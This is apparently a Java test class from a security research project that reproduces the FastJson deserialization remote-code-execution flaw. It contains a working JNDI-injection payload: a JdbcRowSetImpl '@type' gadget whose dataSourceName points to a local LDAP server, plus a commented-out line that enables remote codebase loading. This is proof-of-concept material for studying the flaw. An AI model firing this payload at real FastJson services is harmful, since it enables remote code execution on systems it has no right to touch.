package com.anbai.sec.jndi.injection;

import com.alibaba.fastjson.JSON;

/**
 * Creator: yz
 * Date: 2019/12/28
 */
public class FastJsonRCETest {

	public static void main(String[] args) {
//			// 测试时如果需要允许调用RMI远程引用对象加载请取消如下注释
//		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://127.0.0.1:3890/test\", \"autoCommit\": \"true\" }";

		Object obj = JSON.parse(json);
		System.out.println(obj);
	}

}
